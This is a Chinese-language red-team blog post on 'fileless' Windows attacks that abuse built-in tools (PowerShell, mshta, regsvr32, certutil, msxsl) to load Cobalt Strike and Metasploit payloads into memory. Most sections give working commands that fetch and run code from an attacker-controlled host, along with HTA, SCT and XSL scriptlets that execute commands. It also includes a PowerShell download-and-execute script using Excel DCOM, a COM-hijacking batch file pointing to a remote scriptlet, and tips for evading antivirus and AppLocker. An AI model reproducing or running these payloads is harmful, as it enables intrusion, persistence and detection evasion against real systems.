> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/LD_I0yovRO8MIwjhEe488g)

**什么是无文件攻击？**
=============

传统的恶意软件 (例如. exe) 攻击感染一个系统之前会把恶意文件（例如 exe）复制到目标磁盘中并修改注册表并连接到此文件来达到一个长期隐藏的目的，无文件落地攻击是指即不向磁盘写入可执行文件，而是以脚本形式存在计算机中的注册表子项目中，以此来躲避杀软的检测，那么绕过了传统防病毒（AV）寻找被保存到磁盘上的文件并扫描这些文件以确定它们是否恶意的查杀方法。

**传统的恶意软件攻击流程：**  
1. 投放恶意 PE（可移植可执行文件）到目标磁盘驱动器中  
2. 执行  
3. 长期隐藏 - 需要修改注册表并连接到此恶意 PE。

那么杀毒软件可以通过扫描查杀磁盘驱动器的文件来发现恶意 PE, 如果隐藏得不够深，蓝方也可以轻易把它找出来。

**无文件落地攻击流程：**  
1. 远程加载恶意脚本  
2. 注入内存  
3. 写入注册表（或者自运行）

恶意脚本执行加载都不会在磁盘驱动器中留下文件，那么可以消除将传统的恶意软件 PE（可移植可执行文件）复制到磁盘驱动器的传统步骤来逃避检测。

无文件下对抗传统杀毒软件（AV）
================

这里我们可以看看一下 CrowdStrike 中《无文件攻击白皮书》分析的” 为何传统技术无法抵御无文件攻击 “来快速理解一下无文件落地的意义：

> 由于传统安全解决方案极难检测到无文件攻击，因此无文件攻击正在增加。让我们来看看，为什么当今市场上的一些端点保护技术，对这些无恶意软件入侵如此脆弱。
> 
> 1）传统防病毒（AV）旨在寻找已知恶意软件的特征码。由于无文件攻击没有恶意软件，所以 AV 没有可检测的特征码。
> 
> 2）基于机器学习（ML）的反恶意软件方法，在应对无文件攻击时，面临着与传统 AV 相同的挑战。ML 动态分析未知文件，并将其区分为好的或坏的。但是我们已经注意到，在无文件攻击中，没有要分析的文件，因此 ML 无法提供帮助。
> 
> 3）白名单方法包括列出一台机器上所有良好的进程，以防止未知进程执行。无文件攻击的问题在于，它们利用易受攻击的合法白名单应用程序，并利用内置的操作系统可执行文件。阻止用户和操作系统共同依赖的应用程序，并不是一个好的选项。
> 
> 4）使用失陷指标（IOC）工具来防止无文件攻击也不是很有效。本质上，IOC 类似于传统的 AV 签名，因为它们是攻击者留下的已知恶意制品。然而，由于它们利用合法的进程，并且在内存中操作，所以无文件攻击不会留下制品，因此 IOC 工具几乎找不到任何东西。
> 
> 5）另一种方法涉及沙箱，它可以采取多种形式，包括基于网络的爆破和微虚拟化。由于无文件攻击不使用 PE 文件，因此沙盒没有什么可爆破的。即便真有东西被发送到沙箱，因为无文件攻击通常会劫持合法进程，大多数沙箱也都会忽略它。

**无文件落地攻击的常用手法**
================

一般来说在 windows 的能执行脚本或命令的组件都可以用来利用进行无文件落地攻击。

例如我们常见的

可以利用 Windows 自带的解析器：

powershell（脚本解析器） 》》》powershell.exe（应用程序）  
VB.script（脚本解析器） 》》》cscript.exe（应用程序）  
bat 处理 （脚本解析器） 》》》cmd.exe（应用程序）  
javaSrtipt（脚本解析器） 》》》mshta.exe（应用程序）

利用流程：

远程加载对应 payload 脚本，直接调用解析器注入内存中运行（当然也可以上传脚本到目标中再调用脚本解析器去运行，但是这样不属于无文件落地手法，这里不讨论）

**1.powershell（脚本解析器）利用**
-------------------------

powershell 是微软一种命令行 shell 程序和脚本环境，使命令行用户和脚本编写者可以利用 .NET Framework 的强大功能。

> PowerShell 是一种跨平台的任务自动化和配置管理框架，由命令行管理程序和脚本语言组成。与大多数接受并返回文本的 shell  
> 不同，PowerShell 构建在 .NET 公共语言运行时 (CLR) 的基础之上，接受并返回 .NET 对象。  
> 这一根本上的改变引入了全新的自动化工具和方法。

**常见手法：**  
这里使用 Cobalt Strilke 为例

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglic7joguTvKpX0oJhlQOqVJNwPSMekq4CYpPial8szXhhYzua5YNiaY7JxQ/640?wx_fmt=png)

使用 Cobalt strike 生成一个木马放在 WEB 中

然后在目标中调用 powershell 远程加载执行我们的恶意 ps1，然后在 cobalt strike 中可以看到已经回连上线了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdgliceiaBAQylribuOrN1A3Z4P5h0PnvW34BohTTgGTv9ccNbxrYicdcIqeKYg/640?wx_fmt=png)

**2.Mshta.exe 利用**
------------------

HTA 是 HTML Application 的缩写（HTML 应用程序），是软件开发的新概念，直接将 HTML 保存成 HTA 的格式，就是一个独立的应用软件，与 VB、C++ 等程序语言所设计的软件界面没什么差别。

大多数的 Windows 操作系统都支持 Hta 文件执行，利用 Mshta.exe 解析. hta 文件执行，这里的. hta 文件可以是本地的也可以是可访问的远程主机上的。

HTA 虽然用 HTML、JS 和 CSS 编写，却比普通网页权限大得多。它具有桌面程序的所有权限（读写文件、操作注册表等）。HTA 本来就是被设计为桌面程序的。

例如：

```
<html><head>    <script>        s = new ActiveXObject("WScript.Shell");        s.run("%windir%\\System32\\cmd.exe /c calc.exe", 0);        window.close();    </script></head></html>
```

保存为 HTA 文件后就可以打开 执行后会弹出计算器

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglicKOjAM7iarlic7FnCLhYHr0Tcx5rib1JgU2F7nh10kaDpucAJJYjdqOWeg/640?wx_fmt=png)

**在 cobalt strike 中利用;**

1. 生成一个远端 HTA 恶意脚本

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglicjjDgoreic6KMZPcX2Os6Io7zNiaicRLvrwHgBhyfs2a8YMCcrsfZJApug/640?wx_fmt=png)

设置好监听器

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglicfWsHFpIQbI9HchuymMJhrs4iaNLU8ns4TdD5znMSTrWPd99OkWhSgPw/640?wx_fmt=png)

部署好远端 HTA 木马

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglicEcZwMhBMpB4o5x1B5rtSUz9MQkPkbQ4uadXTFVog1V7tPXkDgibtQTQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglic7mZcvwuUwkuJDibXNOSiaVrqWm8BzSFPyJ1PV5UmZOibg6dhGGLeNHCnA/640?wx_fmt=png)

在目标机器上运行 mshta http://ip/123.hta 即可完成上线

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglicer6RNypBmiadOxNFTZzleVcCxgg624ueVzy0ZAWHaCTdvkwBqSUaicrQ/640?wx_fmt=png)

在 MSF 中利用：

```
use exploit/windows/misc/hta_serverset payload windows/meterpreter/reverse_httpset lhost ipset lport 监听端口exploit -j
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglicukI7CCXsuAjs52Gqic90yUQV2OyGFCOVXU4Va4icAiaBia5BYqib4nHlWww/640?wx_fmt=png)

在目标机器上运行 mshta http://:8080/ycUL3otC.hta 即可完成上线

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglicWodKbOicmTVWMnuLhVKK7r86icemdjGHfjmeMiaPFrjM8ABlSNaLGJmhw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglic4ubawQtRToTR273lXDyb37vZQMIm9bbKuclPbhAY5OzKoXdtk7xhhw/640?wx_fmt=png)

**3.regsvr32.exe**

Regsvr32 命令用于注册 COM 组件，是 Windows 系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行。WinXP 及以上系统的 regsvr32.exe 在 windowssystem32 文件夹下；2000 系统的 regsvr32.exe 在 winntsystem32 文件夹下。  

**语法**

```
regsvr32 [/u] [/s] [/n] [/i[:cmdline]] <Dllname>/u    Unregisters server./s    Prevents displaying messages./n    Prevents calling DllRegisterServer. This parameter requires you to also use the /i parameter./i:<cmdline>    Passes an optional command-line string (cmdline) to DllInstall. If you use this parameter with the /u parameter, it calls DllUninstall.<Dllname>    The name of the .dll file that will be registered./?    Displays help at the command prompt.
```

直接加载 dll 完成上线，同样也可远程加载执行  
这里使用 cobalt strike 演示：

生成一个. dll 的木马：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglictf52gI8ZIkDnCJtorZEqvxE0xuDZGPmiaBXE23oVuYmEHbOMyo3O7hw/640?wx_fmt=png)

部署好远端. dll

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglicQAK0icUMLzAEWcM2GQ6sGBWicSCdXbiaN5SNmYO5RazAyxTuBJic0FOBew/640?wx_fmt=png)

```
regsvr32.exe /s /u /n /i:http://192.168.50.146:80/download/1t.dll scrobj.dll
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglickibpI8kaPTaXDCC2ibFUY2vw9e7WOgMgCc0X7htSTw1L8oCE0dbjEUaA/640?wx_fmt=png)

访问上线。

除了. dll 外，也可以解析. sct 文件。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglicncamooZcZFicEGvVjibZTzHNmyRaQWfUD4quvPBDacIcsxJUicV3KyMvQ/640?wx_fmt=png)

.sct 文件必须是 XML 文件格式，要执行命令可以参考如下：

SCT 文件（实际上是 XML 文件）中具有一个注册标记，其中可以包含 VBScript 或 JScript 代码。请注意，该文件可以具有任何扩展名。它不一定是. sct，但是该技术围绕 SCT 文件的使用和 Windows 脚本组件服务而构建。

例如：

<?XML version="1.0"?>

```
<scriptlet><registration  progid="TESTING"  classid="{A1112221-0000-0000-3000-000DA00DABFC}" >  <script language="JScript">    <![CDATA[      var foo = new ActiveXObject("WScript.Shell").Run("calc.exe");     ]]></script></registration></scriptlet>
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglic80Rv1pUEaxkz1q46ib0TORHnney1KG8TuQ8tr1302LJLicY2vvDIjeSw/640?wx_fmt=png)  
同样我们可以利用该技术可以应用于持久化，绕过 AppLocker，sct 文件内容如下：

```
<?XML version="1.0"?><scriptlet><registration  description="Component"  progid="Component.TESTCB"  version="1.00"  classid="{20002222-0000-0000-0000-000000000002}"></registration> <public>  <method >  <![CDATA[    function exec(){      new ActiveXObject('WScript.Shell').Run('calc.exe');    }  ]]></script></scriptlet>
```

我们这里还是使用 cobalt strike 吧，因为在 cobalt strike 中利用直接生成 com script 的恶意文件，当然手工也可以，但是比较麻烦。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglicBpaVCERXTXibJBX4iaJyyF2twcsBZNHP5s2RrXtTRFmVaLX1qGS2Z9VQ/640?wx_fmt=png)

然后放在我们的 web 服务器中，

cmd 输入 `regsvr32.exe "http://192.168.50.146:80/download/123.sct" scrobj.dll`

直接上线

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdgliccRJLneSGZ5yxrmo8eHYecwiaXlLKFeVqmGNsaQr0j2MhtMesazZWnUQ/640?wx_fmt=png)

上述方法运行完 regsvr32.exe /s /i:http://x.x.x.x/backdoor.sct scrobj.dll 后, scrobj.dll 会创建 COM 对象，并写入注册表中，可以从 HKEY_CLASSES_ROOT 和 HKEY_LOCAL_MACHINE 查看到，可以通过以下的 js 脚本调用触发：

```
var test = new ActiveXObject("Component.TESTCB");test.exec()
```

后面我会出一个 sct 的深度利用文章。sct 挺好玩的

**4.certutil.exe 的利用**
----------------------

Certutil.exe 是命令行程序，作为证书服务的一部分进行安装。你可以使用 certutil.exe 来转储和显示证书颁发机构 (CA) 配置信息、配置证书服务、备份和还原 CA 组件以及验证证书、密钥对和证书链。  
如果 certutil 在没有其他参数的证书颁发机构上运行，则它将显示当前的证书颁发机构配置。如果在非证书颁发机构上运行 certutil，则该命令默认为运行 certutil [-dump] 命令。

具体文档可以看微软中的

```
https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/certutil
```

简单来说就是：

该程序是 Windows 下的一个证书服务的安装程序，可以下载、编码和解码证书。在实际的渗透环境中，我们也可以利用它来解决一些无法上传脚本的情况。

我们从微软文档中重点看一些对渗透 / 红队行动中帮助较大的一些东西

-dump  
转储配置信息或文件。

```
certutil [options] [-dump]certutil [options] [-dump] file
```

-decodehex  
对十六进制编码的文件进行解码。

```
certutil [options] -decodehex infile outfile [type]
```

对 Base64 编码的文件进行解码。

```
certutil [options] -decode infile outfile
```

将文件编码为 Base64。

```
certutil [options] -encode infile outfile
```

ok 我们可以利用 certutil.exe 从我们的远端 c2 中下载我们的恶意代码并执行它  
也可以把我们的恶意代码通过 base64 或 16 进制进行传输并执行

注意：虽然说 certutril 是 Windows 本身自带的程序，但是现在用上述的方法来下载东西杀软都会拦截。但是加一个 - verifyctl 参数就可以绕过这个问题，下载下来的是一个二进制文件，需要修改后缀名为原来的后缀名即可运行

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglico8hXB6sLCXjEmb14aeINXibMibd9FqacVCEKxXL0X46RiaQ4D871qIIQg/640?wx_fmt=png)

我们在把我们要传输的脚本放在 cobalt strike 中（实战的时建议 payload 和回连 c2 分离）。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglicYC5EJCbViaSCE8uoMSDdEstlPsaHkVMmDiapPWAyknaWXSNu5XjOtVVw/640?wx_fmt=png)

保存在当前路径，文件名称和下载文件名称相同

```
certutil  -urlcache  -split  -f   http://192.168.50.146:80/download/file.txt
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglicZIXM39LHmZqicEGFfvGicJUBFax9cmz9MCfibia2fPjK0kme9bmm7icWCkw/640?wx_fmt=png)

保存在当前路径，指定保存文件名称

```
certutil  -urlcache  -split  -f   http://192.168.50.146:80/download/file.txt  test.py
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglicsOesX50XSC8ibZAQrNnB9ricxAG1oLiaVyYG9wDRufjdGqxIVWN2q91Ag/640?wx_fmt=png)

保存在缓存目录，名称随机（权限不够的情况下可以使用）

缓存目录位置：%USERPROFILE%AppDataLocalLowMicrosoftCryptnetUrlCacheContent

```
certutil  -urlcache   -f  http://192.168.50.146:80/download/file.txt
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglicibLoPAZ887iczqVftsF4GfalV29e3qQZdQsc6EK6aJxwvJo8tJLakGwg/640?wx_fmt=png)

配合 powershell 利用;

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglicyMiaSs7ISw7cZQPQJKOmAnZDGuwfKQWApmH8nVW2OciaJS8iaB3ZNCVpA/640?wx_fmt=png)

cobalt strike 生成一个 ps1 的恶意脚本并放在我们的 payload 下发服务器中

```
PS C:\Users\（123223Li）> certutil -urlcache -split -f http://192.168.50.146:80/download/file123 1.ps1****  联机  ****  0000  ...  0de3CertUtil: -URLCache 命令成功完成。PS C:\Users\（123223Li）> .\1.ps1
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglicglwB537kl8L2FYx3PefPMRBkOwgdMiak6X8XuWjOYnTeyLq2OJmLDRQ/640?wx_fmt=png)

当然我们也可以在传输的过程中采用 base64 或 16 进制进行传输然后采用 powershell 解码 base64 或 16 进制去执行恶意代码，这样能保证传输不让查杀，也可以采用 aes 加密等等，不过 key 的交互得处理一下

利用链：powershell 调用 certutil 下载然后调用 Dcom 组件执行恶意代码，麻烦＝隐蔽哈哈哈

这里演示的是调用 Excel.Application 这个 dcom 组件，别的可利用的 com 对象可以看我的另一篇关于 dcom 横向的那个文章。

代码我做成来 ps1 并放在了 github 上，方便远程调用

```
https://github.com/dnsil/certuil-offer-Dcom.ps1
```

cobalt strike 生成一个恶意的 dll（不讨论免杀）并放在我们的 playload 下发服务器中

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglicqyCmASqRI6FE7EccK0ict2gM4BWicInAyqibBEjx1ibEBp6xZqAYWOPdBg/640?wx_fmt=png)

加载我们的利用脚本，可以远程加载。这里演示本地加载;

```
param(     $path,     $u,     $filename           )    certutil.exe -urlcache -split -f $u  $path $filename  $excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application")) $excel.RegisterXLL($path)
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglic9MU4oicA0nMaTIfzNOpnh9nyqQ2ribXW5n55SZ5mbafzmTmBZv06a3Wg/640?wx_fmt=png)

还有一个利用下载劫持 com 的 sct 的批处理文件

```
@echo off reg add HKEY_CURRENT_USER\SOFTWARE\Classes\Bandit.1.00 /ve /t REG_SZ /d Bandit /f 1>nul 2>&1 reg add HKEY_CURRENT_USER\SOFTWARE\Classes\Bandit.1.00\CLSID /ve /t REG_SZ /d {00000001-0000-0000-0000-0000FEEDACDC} /f 1>nul 2>&1 reg add HKEY_CURRENT_USER\SOFTWARE\Classes\Bandit /ve /t REG_SZ /d Bandit /f 1>nul 2>&1 reg add HKEY_CURRENT_USER\SOFTWARE\Classes\Bandit\CLSID /ve /t REG_SZ /d {00000001-0000-0000-0000-0000FEEDACDC} /f 1>nul 2>&1 reg add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC} /ve /t REG_SZ /d Bandit /f 1>nul 2>&1 reg add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32 /ve /t REG_SZ /d C:\WINDOWS\system32\scrobj.dll /f 1>nul 2>&1 reg add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32 /v ThreadingModel  /t REG_SZ /d Apartment /f 1>nul 2>&1 reg add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID /ve /t REG_SZ /d Bandit.1.00 /f 1>nul 2>&1 reg add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL /ve /t REG_SZ /d https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct /f 1>nul 2>&1 reg add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID /ve /t REG_SZ /d Bandit /f 1>nul 2>&1 reg add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{372FCE38-4324-11D0-8810-00A0C903B83C}\TreatAs /ve /t REG_SZ /d {00000001-0000-0000-0000-0000FEEDACDC} /f 1>nul 2>&1 certutil 1>nul 2>&1 reg delete HKEY_CURRENT_USER\SOFTWARE\Classes\Bandit.1.00 /f 1>nul 2>&1 reg delete HKEY_CURRENT_USER\SOFTWARE\Classes\Bandit /f 1>nul 2>&1 reg delete HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC} /f 1>nul 2>&1 reg delete HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{372FCE38-4324-11D0-8810-00A0C903B83C}\TreatAs /f 1>nul 2>&1 echo Done!
```

这里使用 cobalt strike 中的恶意 com script，一样我们放在 web 服务器中

这个位置更改成我们的远程连接：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglicNeSqpCAm6qQrZEUvXOh4LZS6VkjXCxWsD8Z0IibmXzMFjShvdsowdPw/640?wx_fmt=png)

但是我这里利用不了。理论上是可以的哈哈哈哈

利用 certUtil 简便快捷，但是使用后需要注意清除缓存

**5.msxsl.exe 利用**
------------------

这个是 winddows 发布的一个组件但是它并没有安装在 windows 操作系统中，那么为什么要利用它？其实以上都手法都是在目前比较难以利用的了，但是我们熟悉之后可以组合利用来达到我们的目。

msxsl.exe 具有 windows 的签名，它的大小也只有 24.3 KB (24,896 字节)，我们完全可以上传到目标中或者在钓鱼文档中释放加载来进行利用来绕过杀毒软件的检测查杀。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdgliceHnPwb52V6jzgV2f3BDib8U2iamCLO4yB8RsoOws43OlQWmyVDibXFxcQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglichjrF4rWH2qpyoPXRTo06v8t309YQkznz6WibWTGRliak6wxiciaTT5yKibQ/640?wx_fmt=png)

老规矩我们去微软文档中看看这个东西的知识;

好吧我并没有在微软文档这种查找到这个东西知识;

```
https://www.microsoft.com/en-us/download/details.aspx?id=21714
```

我们可以在网络上公开的资料可以知道：

> msxsl.exe 是微软用于命令行下处理 XSL 的一个程序，所以通过他，我们可以执行 JavaScript 进而执行系统命令

执行该工具需要用到 2 个文件，分别为 XML 及 XSL 文件，其命令如下：

```
msxsl.exe test.xml exec.xsl
```

利用手法：  
test.xml 的代码模板:

```
<?xml version="1.0"?>     <?xml-stylesheet type="text/xml" href="C:\Users\Public\Downloads\payload.xsl" ?>                <customers>                            <customer>                                         <name>Microsoft</name>                                  </customer>                             </customers>
```

exec.xsl 代码模板：

```
<?xml version='1.0'?><xsl:stylesheet version="1.0"  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"  xmlns:msxsl="urn:schemas-microsoft-com:xslt"  xmlns:user="http://mycompany.com/mynamespace"><msxsl:script language="JScript" implements-prefix="user">      function xml(nodelist) {                 var r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe");   return nodelist.nextNode().xml;              }</msxsl:script><xsl:template match="/">   <xsl:value-of select="user:xml(.)"/></xsl:template></xsl:stylesheet>
```

网络上的模板都是存在一些小问题的，使用我上面的就行（逼我去学习了一下 xml）当然也可以采用 xml 进行更多操作

本地执行看看

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglicBLnfzFYRDsCAAWDQVjTEY1eicPiazsqw144JHKpFrPCicUibnrw13vfCtg/640?wx_fmt=png)

成功弹出 calc（计算器）

采用 cobalt strike 利用

生成一个 powrshell 的木马

替换到这里去

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglic1Bx5af7Lric8w3jyibPer4t9xwre9PfcpV7DVSO0E82k0h0MG2WpU3UQ/640?wx_fmt=png)

然后加载执行上线

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglicOJMEFZ3o54dSBpouZiaI8OfIGtVX85ia5u2TcUibdibLHyl5LDjW4I0ohw/640?wx_fmt=png)

远程加载执行上线

```
C:\Users\（123223Li）>C:\Users\Public\Downloads\msxsl.exe http://192.168.50.146:80/download/test.xml http://192.168.50.146:80/download/exec.xsl
```

把 test.xml 和 exec.xsl 放在我们的 playload 下发服务器中

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAW6XHZS2SARQDt6icUbdglicqY6v4fN6Ax1GAzBTqWJg6CJJYOuibacBqxx2G0f8F0J8tWTO8ftNwCA/640?wx_fmt=png)

成功上线 cobalt strike。

后记
==

在 windwos 中还存在很多可以利用的脚本和组件，我们可以组合起来利用才能更好，也可以把它们应用到钓鱼中去，采用无文件远程加载我们的恶意代码等等，也可以通释放调用组件来远程加载我们的木马等等操作，反正举一反三就好

未完。。。。。。。。。。

晚安 明天要上课

**参考链接：**  
http://blog.51cto.com/duallay/1979860  
http://www.4hou.com/technology/10508.html  
[https://mp.weixin.qq.com/s/NxkHeYwddvHW9uv9ioyrxQ](https://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==&mid=2247486101&idx=1&sn=a55efbd09b047609be82289770c6f8d2&scene=21#wechat_redirect)  
http://t3ngyu.leanote.com/post/Windows-noFile  
https://www.carbonblack.com/blog/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/  
https://blog.talosintelligence.com/2019/11/hunting-for-lolbins.html

标签: none